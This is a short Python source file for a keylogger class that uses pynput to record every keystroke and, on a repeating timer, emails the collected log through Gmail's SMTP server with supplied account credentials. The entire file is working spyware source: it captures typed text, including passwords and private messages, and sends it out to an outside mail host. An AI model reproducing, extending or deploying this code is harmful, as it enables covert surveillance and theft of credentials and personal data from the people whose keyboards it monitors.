#!/usr/bin/env python
import pynput.keyboard  # Allow to monitor key & mouse logs
import threading, smtplib

log = ""


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    # Takes string & append it to log
    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        # Storing all key strokes
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    # Report function
    def report(self):
        # Declaring log
        # Reporting
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        # Resetting log after reporting
        self.log = ""
        # Creating timer using threading
        timer = threading.Timer(self.interval, self.report)
        # Running thread
        timer.start()

    def send_mail(self, email, password, message):
        # Creating SMTP server instance of gmail
        server = smtplib.SMTP("smtp.gmail.com", 587)
        # Initiate TLS server
        server.starttls()
        # Login to email
        server.login(email, password)
        # Send mail
        server.sendmail(email, email, message)
        # Stopping the server
        server.quit()

    def start(self):
        # Keyboard listener object to listen to keystroke
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

        # Starting listener
        with keyboard_listener:
            # sending mail
            self.report()
            keyboard_listener.join()
